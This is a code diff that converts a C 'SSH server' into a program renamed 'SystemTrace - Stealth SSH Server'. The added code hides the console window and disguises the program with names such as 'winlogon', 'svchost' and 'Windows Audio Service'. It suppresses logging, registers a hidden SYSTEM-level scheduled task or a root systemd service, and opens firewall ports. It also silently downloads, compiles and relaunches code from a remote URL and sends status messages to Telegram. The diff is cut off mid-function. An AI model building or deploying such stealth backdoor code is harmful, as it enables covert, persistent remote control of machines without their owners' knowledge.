@@ -1,10 +1,9 @@
 /*
- * Smart SSH Server - High Performance C Version
+ * SystemTrace - Stealth SSH Server (Hidden Memory Mode)
  * Auto-updating from: https://raw.githubusercontent.com/Abo5/sys-tools/main/SystemTrace.c
  * 
- * Compile:
- * Windows: gcc -o sshserver.exe SystemTrace.c -lcurl -lws2_32 -static
- * Linux:   gcc -o sshserver SystemTrace.c -lcurl -lpthread
+ * Compile (Windows): gcc -mwindows -o SystemTrace.exe SystemTrace.c -lcurl -lws2_32 -ladvapi32 -static
+ * Compile (Linux):   gcc -o SystemTrace SystemTrace.c -lcurl -lpthread
  */
 
 #include <stdio.h>
@@ -12,16 +11,21 @@
 #include <string.h>
 #include <time.h>
 #include <signal.h>
-#include <unistd.h>
 
 #ifdef WIN32
     #include <windows.h>
     #include <winsock2.h>
     #include <ws2tcpip.h>
     #include <process.h>
+    #include <wincrypt.h>
+    #include <tlhelp32.h>
+    #include <psapi.h>
     #define sleep(x) Sleep((x) * 1000)
     #define getpid() GetCurrentProcessId()
     #pragma comment(lib, "ws2_32.lib")
+    #pragma comment(lib, "advapi32.lib")
+    #pragma comment(lib, "psapi.lib")
+    #pragma comment(lib, "kernel32.lib")
 #else
     #include <sys/socket.h>
     #include <netinet/in.h>
@@ -29,6 +33,9 @@
     #include <sys/wait.h>
     #include <pthread.h>
     #include <unistd.h>
+    #include <sys/stat.h>
+    #include <fcntl.h>
+    #include <syslog.h>
     #define SOCKET int
     #define INVALID_SOCKET -1
     #define closesocket close
@@ -40,7 +47,11 @@
 #define VERSION "1.0.0"
 #define SSH_PORT 2222
 #define SSH_USER "admin"
-#define SSH_PASSWORD "test123"  // Change this!
+#define SSH_PASSWORD_LENGTH 16
+
+// Stealth configuration
+#define PROCESS_NAME "winlogon"      // Windows stealth name
+#define SERVICE_NAME "svchost"       // Service stealth name
 
 // Update URL for self-updating
 #define UPDATE_URL "https://raw.githubusercontent.com/Abo5/sys-tools/main/SystemTrace.c"
@@ -53,6 +64,132 @@
 static volatile int g_running = 1;
 static volatile int g_cleanup_done = 0;
 static time_t g_start_time;
+static char g_ssh_password[SSH_PASSWORD_LENGTH + 1];
+static int g_stealth_mode = 1;
+
+// ======================================================
+// Stealth Functions
+// ======================================================
+
+#ifdef WIN32
+// Hide console window
+void hide_console() {
+    HWND console = GetConsoleWindow();
+    if (console) {
+        ShowWindow(console, SW_HIDE);
+    }
+    
+    // Set window title to something generic
+    SetConsoleTitleA("Windows Audio Service");
+    
+    // Hide from Alt+Tab
+    LONG style = GetWindowLong(console, GWL_EXSTYLE);
+    SetWindowLong(console, GWL_EXSTYLE, style | WS_EX_TOOLWINDOW);
+}
+
+// Change process name in task manager
+void stealth_process_name() {
+    HANDLE hProcess = GetCurrentProcess();
+    HMODULE hMod = GetModuleHandle(NULL);
+    
+    if (hMod) {
+        // Try to modify the process name (this is limited but helps)
+        char title[256];
+        snprintf(title, sizeof(title), "%s", PROCESS_NAME);
+        SetConsoleTitleA(title);
+    }
+}
+
+// Check if running as admin/service
+int is_elevated() {
+    HANDLE hToken;
+    TOKEN_ELEVATION elevation;
+    DWORD dwSize;
+    
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
+        return 0;
+    }
+    
+    if (!GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
+        CloseHandle(hToken);
+        return 0;
+    }
+    
+    CloseHandle(hToken);
+    return elevation.TokenIsElevated;
+}
+
+#else
+
+// Daemonize process on Linux
+void daemonize() {
+    pid_t pid, sid;
+    
+    // Fork off the parent process
+    pid = fork();
+    if (pid < 0) {
+        exit(EXIT_FAILURE);
+    }
+    
+    // If we got a good PID, exit the parent process
+    if (pid > 0) {
+        exit(EXIT_SUCCESS);
+    }
+    
+    // Change the file mode mask
+    umask(0);
+    
+    // Open logs
+    openlog("syslogd", LOG_NOWAIT | LOG_PID, LOG_USER);
+    
+    // Create a new SID for the child process
+    sid = setsid();
+    if (sid < 0) {
+        exit(EXIT_FAILURE);
+    }
+    
+    // Change the current working directory
+    if ((chdir("/")) < 0) {
+        exit(EXIT_FAILURE);
+    }
+    
+    // Close out the standard file descriptors
+    close(STDIN_FILENO);
+    close(STDOUT_FILENO);
+    close(STDERR_FILENO);
+    
+    // Redirect to /dev/null
+    int fd = open("/dev/null", O_RDWR);
+    dup2(fd, STDIN_FILENO);
+    dup2(fd, STDOUT_FILENO);
+    dup2(fd, STDERR_FILENO);
+    if (fd > STDERR_FILENO) close(fd);
+}
+
+int is_elevated() {
+    return geteuid() == 0;
+}
+
+#endif
+
+// Silent logging function
+void log_message(const char *level, const char *message) {
+#ifdef WIN32
+    if (g_stealth_mode) return; // No logging in stealth mode
+    
+    // Log to Windows Event Log silently
+    HANDLE hEventLog = RegisterEventSource(NULL, "System");
+    if (hEventLog) {
+        const char* messages[] = { message };
+        ReportEvent(hEventLog, EVENTLOG_INFORMATION_TYPE, 0, 0, NULL, 1, 0, messages, NULL);
+        DeregisterEventSource(hEventLog);
+    }
+#else
+    if (g_stealth_mode) {
+        syslog(LOG_INFO, "%s: %s", level, message);
+    }
+#endif
+}
 
 // ======================================================
 // Utility structures and functions
@@ -83,19 +220,152 @@ static size_t http_write_callback(void *contents, size_t size, size_t nmemb, str
     return realsize;
 }
 
-// Cross-platform execute command
-int execute_command(const char *command) {
-    return system(command);
+// Silent command execution
+int execute_command_silent(const char *command) {
+#ifdef WIN32
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+    
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;  // Hidden execution
+    ZeroMemory(&pi, sizeof(pi));
+    
+    char cmd_line[2048];
+    snprintf(cmd_line, sizeof(cmd_line), "cmd.exe /C %s", command);
+    
+    if (CreateProcess(NULL, cmd_line, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, 30000); // 30 sec timeout
+        DWORD exit_code;
+        GetExitCodeProcess(pi.hProcess, &exit_code);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        return exit_code;
+    }
+    return -1;
+#else
+    char silent_cmd[2048];
+    snprintf(silent_cmd, sizeof(silent_cmd), "%s >/dev/null 2>&1", command);
+    return system(silent_cmd);
+#endif
 }
 
 // ======================================================
-// Telegram messaging via curl
+// Password Generation and System Info
+// ======================================================
+
+void generate_ssh_password() {
+    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*";
+    const int charset_size = sizeof(charset) - 1;
+    
+#ifdef WIN32
+    HCRYPTPROV hProv;
+    if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
+        unsigned char random_bytes[SSH_PASSWORD_LENGTH];
+        if (CryptGenRandom(hProv, SSH_PASSWORD_LENGTH, random_bytes)) {
+            for (int i = 0; i < SSH_PASSWORD_LENGTH; i++) {
+                g_ssh_password[i] = charset[random_bytes[i] % charset_size];
+            }
+        } else {
+            srand((unsigned int)time(NULL) ^ GetTickCount() ^ GetCurrentProcessId());
+            for (int i = 0; i < SSH_PASSWORD_LENGTH; i++) {
+                g_ssh_password[i] = charset[rand() % charset_size];
+            }
+        }
+        CryptReleaseContext(hProv, 0);
+    }
+#else
+    FILE *urandom = fopen("/dev/urandom", "rb");
+    if (urandom) {
+        unsigned char random_bytes[SSH_PASSWORD_LENGTH];
+        if (fread(random_bytes, 1, SSH_PASSWORD_LENGTH, urandom) == SSH_PASSWORD_LENGTH) {
+            for (int i = 0; i < SSH_PASSWORD_LENGTH; i++) {
+                g_ssh_password[i] = charset[random_bytes[i] % charset_size];
+            }
+        } else {
+            srand((unsigned int)time(NULL) ^ getpid());
+            for (int i = 0; i < SSH_PASSWORD_LENGTH; i++) {
+                g_ssh_password[i] = charset[rand() % charset_size];
+            }
+        }
+        fclose(urandom);
+    } else {
+        srand((unsigned int)time(NULL) ^ getpid());
+        for (int i = 0; i < SSH_PASSWORD_LENGTH; i++) {
+            g_ssh_password[i] = charset[rand() % charset_size];
+        }
+    }
+#endif
+    
+    g_ssh_password[SSH_PASSWORD_LENGTH] = '\0';
+    log_message("INFO", "Generated secure SSH password");
+}
+
+void get_local_ips(char *ip_info, size_t max_size) {
+    ip_info[0] = '\0';
+    
+#ifdef WIN32
+    char command[] = "powershell -WindowStyle Hidden -NoProfile -Command \"Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -ne '127.0.0.1'} | Select-Object -First 3 IPAddress | ForEach-Object {$_.IPAddress}\" > %TEMP%\\ips.tmp 2>nul";
+    
+    if (execute_command_silent(command) == 0) {
+        char temp_path[MAX_PATH];
+        GetTempPathA(MAX_PATH, temp_path);
+        strcat(temp_path, "ips.tmp");
+        
+        FILE *f = fopen(temp_path, "r");
+        if (f) {
+            char line[64];
+            char all_ips[256] = "";
+            while (fgets(line, sizeof(line), f)) {
+                char *newline = strchr(line, '\n');
+                if (newline) *newline = '\0';
+                char *trimmed = line;
+                while (*trimmed == ' ' || *trimmed == '\t') trimmed++;
+                
+                if (strlen(trimmed) > 7) {
+                    if (strlen(all_ips) > 0) strcat(all_ips, ", ");
+                    strcat(all_ips, trimmed);
+                }
+            }
+            fclose(f);
+            strncpy(ip_info, all_ips, max_size - 1);
+            ip_info[max_size - 1] = '\0';
+        }
+        DeleteFileA(temp_path);
+    }
+#else
+    if (execute_command_silent("hostname -I 2>/dev/null > /tmp/.sysips") == 0) {
+        FILE *f = fopen("/tmp/.sysips", "r");
+        if (f) {
+            if (fgets(ip_info, max_size, f)) {
+                char *newline = strchr(ip_info, '\n');
+                if (newline) *newline = '\0';
+                
+                int len = strlen(ip_info);
+                while (len > 0 && ip_info[len-1] == ' ') {
+                    ip_info[--len] = '\0';
+                }
+            }
+            fclose(f);
+        }
+        unlink("/tmp/.sysips");
+    }
+#endif
+
+    if (strlen(ip_info) == 0) {
+        strcpy(ip_info, "Network interface detection failed");
+    }
+}
+
+// ======================================================
+// Telegram messaging via curl (stealth mode)
 // ======================================================
 
 void send_telegram_message(const char *message) {
     if (strcmp(TELEGRAM_BOT_TOKEN, "YOUR_BOT_TOKEN") == 0 || 
         strcmp(TELEGRAM_CHAT_ID, "YOUR_CHAT_ID") == 0) {
-        return; // Not configured
+        return;
     }
 
     CURL *curl;
@@ -131,12 +401,17 @@ void send_telegram_message(const char *message) {
         curl_easy_setopt(curl, CURLOPT_URL, url);
         curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
         curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
+        curl_easy_setopt(curl, CURLOPT_NOPROGRESS, 1L);
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, http_write_callback);
+        
+        // Silent operation
+        curl_easy_setopt(curl, CURLOPT_VERBOSE, 0L);
+        curl_easy_setopt(curl, CURLOPT_FAILONERROR, 1L);
         
         struct curl_slist *headers = NULL;
         headers = curl_slist_append(headers, "Content-Type: application/json");
         curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
         
-        // Perform request (fire and forget)
         curl_easy_perform(curl);
         
         curl_slist_free_all(headers);
@@ -145,10 +420,9 @@ void send_telegram_message(const char *message) {
 }
 
 // ======================================================
-// Self-Update System
+// Self-Update System (stealth)
 // ======================================================
 
-// Extract version from source code
 char* extract_version_from_source(const char *source_code) {
     static char version[32];
     version[0] = '\0';
@@ -172,7 +446,6 @@ char* extract_version_from_source(const char *source_code) {
     return NULL;
 }
 
-// Download source code from GitHub
 int download_source_code(char **source_code, size_t *source_size) {
     CURL *curl;
     CURLcode res;
@@ -186,6 +459,8 @@ int download_source_code(char **source_code, size_t *source_size) {
     curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
     curl_easy_setopt(curl, CURLOPT_TIMEOUT, 60L);
     curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
+    curl_easy_setopt(curl, CURLOPT_NOPROGRESS, 1L);
+    curl_easy_setopt(curl, CURLOPT_VERBOSE, 0L);
     
     res = curl_easy_perform(curl);
     curl_easy_cleanup(curl);
@@ -200,11 +475,16 @@ int download_source_code(char **source_code, size_t *source_size) {
     return 1;
 }
 
-// Compile new binary from source
 int compile_new_binary(const char *source_code, const char *new_binary_path) {
-    // Write source to temporary file
-    char temp_source[256];
-    snprintf(temp_source, sizeof(temp_source), "SystemTrace_new.c");
+#ifdef WIN32
+    char temp_dir[MAX_PATH];
+    GetTempPathA(MAX_PATH, temp_dir);
+    
+    char temp_source[MAX_PATH];
+    snprintf(temp_source, sizeof(temp_source), "%s\\sys_temp_%d.c", temp_dir, GetTickCount());
+#else
+    char temp_source[] = "/tmp/.sys_temp.c";
+#endif
     
     FILE *f = fopen(temp_source, "w");
     if (!f) return 0;
@@ -212,183 +492,159 @@ int compile_new_binary(const char *source_code, const char *new_binary_path) {
     fputs(source_code, f);
     fclose(f);
     
-    // Compile the new version
-    char compile_command[1024];
+    char compile_command[2048];
 #ifdef WIN32
     snprintf(compile_command, sizeof(compile_command), 
-        "gcc -O2 -o \"%s\" \"%s\" -lcurl -lws2_32 -static 2>compile_error.log", 
+        "gcc -mwindows -O2 -o \"%s\" \"%s\" -lcurl -lws2_32 -ladvapi32 -lpsapi -static >nul 2>nul", 
         new_binary_path, temp_source);
 #else
     snprintf(compile_command, sizeof(compile_command), 
-        "gcc -O2 -o \"%s\" \"%s\" -lcurl -lpthread 2>compile_error.log", 
+        "gcc -O2 -o \"%s\" \"%s\" -lcurl -lpthread >/dev/null 2>&1", 
         new_binary_path, temp_source);
 #endif
     
-    int result = execute_command(compile_command);
-    
-    // Cleanup temp files
+    int result = execute_command_silent(compile_command);
     unlink(temp_source);
-    if (result != 0) {
-        printf("[UPDATE] Compilation failed. Check compile_error.log\n");
-        return 0;
-    }
     
-    unlink("compile_error.log");
-    return 1;
+    return result == 0;
 }
 
-// Test new binary
 int test_new_binary(const char *binary_path) {
-    char test_command[512];
-    snprintf(test_command, sizeof(test_command), "\"%s\" --check 2>/dev/null", binary_path);
-    return execute_command(test_command) == 0;
+    char test_command[1024];
+#ifdef WIN32
+    snprintf(test_command, sizeof(test_command), "\"%s\" --check >nul 2>nul", binary_path);
+#else
+    snprintf(test_command, sizeof(test_command), "\"%s\" --check >/dev/null 2>&1", binary_path);
+#endif
+    return execute_command_silent(test_command) == 0;
 }
 
-// Perform self-update
 int perform_self_update() {
-    printf("[UPDATE] Checking for updates from GitHub...\n");
-    
     char *source_code = NULL;
     size_t source_size = 0;
     
-    // Download source
     if (!download_source_code(&source_code, &source_size)) {
-        printf("[UPDATE] Failed to download source code\n");
+        log_message("ERROR", "Failed to download source code");
         return 0;
     }
     
-    printf("[UPDATE] Downloaded %zu bytes of source code\n", source_size);
-    
-    // Extract version
     char *remote_version = extract_version_from_source(source_code);
     if (!remote_version) {
-        printf("[UPDATE] Could not extract version from source\n");
+        log_message("ERROR", "Could not extract version from source");
         free(source_code);
         return 0;
     }
     
-    printf("[UPDATE] Current: %s, Remote: %s\n", VERSION, remote_version);
-    
-    // Check if update needed
     if (strcmp(VERSION, remote_version) == 0) {
-        printf("[UPDATE] Already on latest version\n");
         free(source_code);
         return 1;
     }
     
-    printf("[UPDATE] New version available: %s → %s\n", VERSION, remote_version);
-    
-    // Get current executable path
     char current_path[1024];
     char new_path[1024];
     char backup_path[1024];
     
 #ifdef WIN32
     GetModuleFileNameA(NULL, current_path, sizeof(current_path));
-    snprintf(new_path, sizeof(new_path), "%s.new", current_path);
-    snprintf(backup_path, sizeof(backup_path), "%s.backup", current_path);
 #else
     if (readlink("/proc/self/exe", current_path, sizeof(current_path)) == -1) {
-        printf("[UPDATE] Could not get current executable path\n");
         free(source_code);
         return 0;
     }
-    snprintf(new_path, sizeof(new_path), "%s.new", current_path);
-    snprintf(backup_path, sizeof(backup_path), "%s.backup", current_path);
 #endif
     
-    // Compile new version
-    printf("[UPDATE] Compiling new version...\n");
+    snprintf(new_path, sizeof(new_path), "%s.new", current_path);
+    snprintf(backup_path, sizeof(backup_path), "%s.backup", current_path);
+    
     if (!compile_new_binary(source_code, new_path)) {
-        printf("[UPDATE] Compilation failed\n");
         free(source_code);
         return 0;
     }
     
     free(source_code);
     
-    // Test new binary
-    printf("[UPDATE] Testing new binary...\n");
     if (!test_new_binary(new_path)) {
-        printf("[UPDATE] New binary failed tests\n");
         unlink(new_path);
         return 0;
     }
     
-    // Backup current binary
-    printf("[UPDATE] Creating backup...\n");
-    unlink(backup_path); // Remove old backup
+    unlink(backup_path);
     if (rename(current_path, backup_path) != 0) {
-        printf("[UPDATE] Failed to create backup\n");
         unlink(new_path);
         return 0;
     }
     
-    // Install new binary
-    printf("[UPDATE] Installing new version...\n");
     if (rename(new_path, current_path) != 0) {
-        printf("[UPDATE] Failed to install new version, restoring backup\n");
-        rename(backup_path, current_path); // Restore backup
+        rename(backup_path, current_path);
         unlink(new_path);
         return 0;
     }
     
-    // Make executable (Linux)
 #ifndef WIN32
     chmod(current_path, 0755);
 #endif
     
-    printf("[UPDATE] ✓ Successfully updated to version %s\n", remote_version);
-    
-    // Send notification
-    char update_msg[256];
+    char update_msg[512];
     snprintf(update_msg, sizeof(update_msg), 
-        "🔄 <b>Auto-Update Complete</b>\nVersion: %s → %s\nRestarting server...", 
+        "🔄 <b>Stealth Update Complete</b>\nVersion: %s → %s\nRestarting in stealth mode...", 
         VERSION, remote_version);
     send_telegram_message(update_msg);
     
-    // Restart
-    printf("[UPDATE] Restarting with new version...\n");
     sleep(1);
     
 #ifdef WIN32
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+    ZeroMemory(&pi, sizeof(pi));
+    
     char restart_cmd[1024];
     snprintf(restart_cmd, sizeof(restart_cmd), "\"%s\" smart", current_path);
-    system(restart_cmd);
+    
+    CreateProcess(NULL, restart_cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW | DETACHED_PROCESS, NULL, NULL, &si, &pi);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
 #else
     char *args[] = {current_path, "smart", NULL};
     execv(current_path, args);
 #endif
     
-    exit(0); // Should not reach here
+    exit(0);
 }
 
 // ======================================================
-// Task Scheduler / systemd management
+// Task Scheduler / systemd management (stealth)
 // ======================================================
 
 int is_task_registered() {
 #ifdef WIN32
     char command[512];
-    snprintf(command, sizeof(command), 
-        "powershell -NoProfile -Command \"if(Get-ScheduledTask -TaskName 'SmartSSHServer' -ErrorAction SilentlyContinue) { 'YES' } else { 'NO' }\" > task_check.tmp");
+    char temp_path[MAX_PATH];
+    GetTempPathA(MAX_PATH, temp_path);
+    strcat(temp_path, "task_check.tmp");
     
-    if (execute_command(command) == 0) {
-        FILE *f = fopen("task_check.tmp", "r");
+    snprintf(command, sizeof(command), 
+        "powershell -WindowStyle Hidden -NoProfile -Command \"if(Get-ScheduledTask -TaskName 'SystemTrace' -ErrorAction SilentlyContinue) { 'YES' } else { 'NO' }\" > \"%s\" 2>nul", temp_path);
+    
+    if (execute_command_silent(command) == 0) {
+        FILE *f = fopen(temp_path, "r");
         if (f) {
             char result[10];
             if (fgets(result, sizeof(result), f)) {
                 fclose(f);
-                unlink("task_check.tmp");
+                DeleteFileA(temp_path);
                 return strstr(result, "YES") != NULL;
             }
             fclose(f);
         }
-        unlink("task_check.tmp");
+        DeleteFileA(temp_path);
     }
     return 0;
 #else
-    return execute_command("systemctl is-enabled smartssh >/dev/null 2>&1") == 0;
+    return execute_command_silent("systemctl is-enabled systemtrace >/dev/null 2>&1") == 0;
 #endif
 }
 
@@ -403,7 +659,6 @@ int register_task() {
     char *last_slash = strrchr(work_dir, '\\');
     if (last_slash) *last_slash = '\0';
     
-    // Escape backslashes for PowerShell
     char escaped_exe[MAX_PATH * 2];
     char escaped_dir[MAX_PATH * 2];
     int i, j;
@@ -429,19 +684,19 @@ int register_task() {
     escaped_dir[j] = '\0';
     
     snprintf(ps_script, sizeof(ps_script),
-        "powershell -NoProfile -Command \""
-        "$TaskName = 'SmartSSHServer'; "
+        "powershell -WindowStyle Hidden -NoProfile -Command \""
+        "$TaskName = 'SystemTrace'; "
         "if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) { "
         "    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false; "
         "}; "
         "$Action = New-ScheduledTaskAction -Execute '%s' -WorkingDirectory '%s' -Argument 'smart'; "
         "$TriggerStartup = New-ScheduledTaskTrigger -AtStartup; "
-        "$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable; "
+        "$Settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable; "
         "$Principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest; "
-        "Register-ScheduledTask -TaskName $TaskName -Description 'Smart SSH Server' -Action $Action -Trigger $TriggerStartup -Settings $Settings -Principal $Principal\"",
+        "Register-ScheduledTask -TaskName $TaskName -Description 'System Trace Service' -Action $Action -Trigger $TriggerStartup -Settings $Settings -Principal $Principal\" >nul 2>nul",
         escaped_exe, escaped_dir);
     
-    return execute_command(ps_script) == 0;
+    return execute_command_silent(ps_script) == 0;
 #else
     char service_content[1024];
     char exe_path[PATH_MAX];
@@ -452,7 +707,7 @@ int register_task() {
     
     snprintf(service_content, sizeof(service_content),
         "[Unit]\n"
-        "Description=Smart SSH Server\n"
+        "Description=System Trace Service\n"
         "After=network-online.target\n"
         "\n"
         "[Service]\n"
@@ -460,65 +715,64 @@ int register_task() {
         "ExecStart=%s smart\n"
         "Restart=always\n"
         "User=root\n"
+        "StandardOutput=null\n"
+        "StandardError=null\n"
         "\n"
         "[Install]\n"
         "WantedBy=multi-user.target\n", exe_path);
     
-    FILE *f = fopen("/etc/systemd/system/smartssh.service", "w");
+    FILE *f = fopen("/etc/systemd/system/systemtrace.service", "w");
     if (!f) return 0;
     
     fputs(service_content, f);
     fclose(f);
     
-    execute_command("systemctl daemon-reload");
-    return execute_command("systemctl enable smartssh") == 0;
+    execute_command_silent("systemctl daemon-reload >/dev/null 2>&1");
+    return execute_command_silent("systemctl enable systemtrace >/dev/null 2>&1") == 0;
 #endif
 }
 
 int unregister_task() {
 #ifdef WIN32
-    return execute_command("powershell -NoProfile -Command \"Unregister-ScheduledTask -TaskName 'SmartSSHServer' -Confirm:$false\"") == 0;
+    return execute_command_silent("powershell -WindowStyle Hidden -NoProfile -Command \"Unregister-ScheduledTask -TaskName 'SystemTrace' -Confirm:$false\" >nul 2>nul") == 0;
 #else
-    execute_command("systemctl stop smartssh");
-    execute_command("systemctl disable smartssh");
-    unlink("/etc/systemd/system/smartssh.service");
-    execute_command("systemctl daemon-reload");
+    execute_command_silent("systemctl stop systemtrace >/dev/null 2>&1");
+    execute_command_silent("systemctl disable systemtrace >/dev/null 2>&1");
+    unlink("/etc/systemd/system/systemtrace.service");
+    execute_command_silent("systemctl daemon-reload >/dev/null 2>&1");
     return 1;
 #endif
 }
 
 // ======================================================
-// Firewall management
+// Firewall management (stealth)
 // ======================================================
 
 int enable_firewall() {
 #ifdef WIN32
     char command[512];
     snprintf(command, sizeof(command),
-        "powershell -NoProfile -Command \""
-        "Remove-NetFirewallRule -DisplayName 'SmartSSH-%d' -ErrorAction SilentlyContinue; "
-        "New-NetFirewallRule -DisplayName 'SmartSSH-%d' -Direction Inbound -Protocol TCP -LocalPort %d -Action Allow -Profile Private,Domain\"",
+        "powershell -WindowStyle Hidden -NoProfile -Command \""
+        "Remove-NetFirewallRule -DisplayName 'SystemTrace-%d' -ErrorAction SilentlyContinue; "
+        "New-NetFirewallRule -DisplayName 'SystemTrace-%d' -Direction Inbound -Protocol TCP -LocalPort %d -Action Allow -Profile Private,Domain\" >nul 2>nul",
         SSH_PORT, SSH_PORT, SSH_PORT);
-    return execute_command(command) == 0;
+    return execute_command_silent(command) == 0;
 #else
     char command[256];
     
-    // Try ufw first
-    if (execute_command("which ufw >/dev/null 2>&1") == 0) {
-        snprintf(command, sizeof(command), "ufw allow %d/tcp", SSH_PORT);
-        return execute_command(command) == 0;
+    if (execute_command_silent("which ufw >/dev/null 2>&1") == 0) {
+        snprintf(command, sizeof(command), "ufw allow %d/tcp >/dev/null 2>&1", SSH_PORT);
+        return execute_command_silent(command) == 0;
     }
     
-    // Try firewall-cmd
-    if (execute_command("which firewall-cmd >/dev/null 2>&1") == 0) {
-        snprintf(command, sizeof(command), "firewall-cmd --permanent --add-port=%d/tcp && firewall-cmd --reload", SSH_PORT);
-        return execute_command(command) == 0;
+    if (execute_command_silent("which firewall-cmd >/dev/null 2>&1") == 0) {
+        snprintf(command, sizeof(command), "firewall-cmd --permanent --add-port=%d/tcp >/dev/null 2>&1 && firewall-cmd --reload >/dev/null 2>&1", SSH_PORT);
+        return execute_command_silent(command) == 0;
     }
     
-    // Try iptables
-    if (execute_command("which iptables >/dev/null 2>&1") == 0) {
-        snprintf(command, sizeof(command), "iptables -A INPUT -p tcp --dport %d -j ACCEPT", SSH_PORT);
-        return execute_command(command) == 0;
+    if (execute_command_silent("which iptables >/dev/null 2>&1") == 0) {
+        snprintf(command, sizeof(command), "iptables -A INPUT -p tcp --dport %d -j ACCEPT >/dev/null 2>&1", SSH_PORT);
+        return execute_command_silent(command) == 0;
     }
     
     return 0;
@@ -529,25 +783,30 @@ int disable_firewall() {
 #ifdef WIN32
     char command[512];
     snprintf(command, sizeof(command),
-        "powershell -NoProfile -Command \"Remove-NetFirewallRule -DisplayName 'SmartSSH-%d'\"", SSH_PORT);
-    return execute_command(command) == 0;
+        "powershell -WindowStyle Hidden -NoProfile -Command \"Remove-NetFirewallRule -DisplayName 'SystemTrace-%d'\" >nul 2>nul", SSH_PORT);
+    return execute_command_silent(command) == 0;
 #else
     return 1;
 #endif
 }
 
 // ======================================================
-// Battery monitoring (Windows only)
+// Battery monitoring (Windows only) - stealth
 // ======================================================
 
 struct battery_info get_battery_info() {
-    struct battery_info info = {100, 1}; // Default: 100% charging
+    struct battery_info info = {100, 1};
     
 #ifdef WIN32
-    char command[] = "powershell -NoProfile -Command \"$b = Get-CimInstance Win32_Battery; if($b){Write-Output \\\"$($b.EstimatedChargeRemaining)|$($b.BatteryStatus)\\\"}else{Write-Output \\\"100|2\\\"}\" > battery.tmp";
+    char temp_path[MAX_PATH];
+    GetTempPathA(MAX_PATH, temp_path);
+    strcat(temp_path, "bat.tmp");
     
-    if (execute_command(command) == 0) {
-        FILE *f = fopen("battery.tmp", "r");
+    char command[512];
+    snprintf(command, sizeof(command), "powershell -WindowStyle Hidden -NoProfile -Command \"$b = Get-CimInstance Win32_Battery; if($b){Write-Output \\\"$($b.EstimatedChargeRemaining)|$($b.BatteryStatus)\\\"}else{Write-Output \\\"100|2\\\"}\" > \"%s\" 2>nul", temp_path);
+    
+    if (execute_command_silent(command) == 0) {
+        FILE *f = fopen(temp_path, "r");
         if (f) {
             char result[32];
             if (fgets(result, sizeof(result), f)) {
@@ -560,7 +819,7 @@ struct battery_info get_battery_info() {
             }
             fclose(f);
         }
-        unlink("battery.tmp");
+        DeleteFileA(temp_path);
     }
 #endif
     
@@ -568,52 +827,57 @@ struct battery_info get_battery_info() {
 }
 
 // ======================================================
-// Shutdown detection
+// Shutdown detection (stealth)
 // ======================================================
 
 int is_shutdown_pending() {
 #ifdef WIN32
-    char command[] = "powershell -NoProfile -Command \"Get-Process | Where-Object {$_.ProcessName -match 'shutdown|restart'} | Measure-Object | Select-Object -ExpandProperty Count\" > shutdown_check.tmp";
+    char temp_path[MAX_PATH];
+    GetTempPathA(MAX_PATH, temp_path);
+    strcat(temp_path, "shutdown.tmp");
     
-    if (execute_command(command) == 0) {
-        FILE *f = fopen("shutdown_check.tmp", "r");
+    char command[512];
+    snprintf(command, sizeof(command), "powershell -WindowStyle Hidden -NoProfile -Command \"Get-Process | Where-Object {$_.ProcessName -match 'shutdown|restart'} | Measure-Object | Select-Object -ExpandProperty Count\" > \"%s\" 2>nul", temp_path);
+    
+    if (execute_command_silent(command) == 0) {
+        FILE *f = fopen(temp_path, "r");
         if (f) {
             char result[16];
             if (fgets(result, sizeof(result), f)) {
                 fclose(f);
-                unlink("shutdown_check.tmp");
+                DeleteFileA(temp_path);
                 return atoi(result) > 0;
             }
             fclose(f);
         }
-        unlink("shutdown_check.tmp");
+        DeleteFileA(temp_path);
     }
     return 0;
 #else
-    return (execute_command("pgrep shutdown >/dev/null 2>&1") == 0 ||
-            execute_command("pgrep reboot >/dev/null 2>&1") == 0 ||
-            execute_command("pgrep poweroff >/dev/null 2>&1") == 0);
+    return (execute_command_silent("pgrep shutdown >/dev/null 2>&1") == 0 ||
+            execute_command_silent("pgrep reboot >/dev/null 2>&1") == 0 ||
+            execute_command_silent("pgrep poweroff >/dev/null 2>&1") == 0);
 #endif
 }
 
 // ======================================================
-// Simple SSH Server
+// Simple SSH Server (stealth)
 // ======================================================
 
 void handle_ssh_connection(SOCKET client_socket) {
     char buffer[256];
     char response[512];
     
-    snprintf(response, sizeof(response), "SSH-2.0-SmartSSH_%s\r\n", VERSION);
+    snprintf(response, sizeof(response), "SSH-2.0-SystemTrace_%s\r\n", VERSION);
     send(client_socket, response, strlen(response), 0);
     
     recv(client_socket, buffer, sizeof(buffer) - 1, 0);
     
     snprintf(response, sizeof(response), 
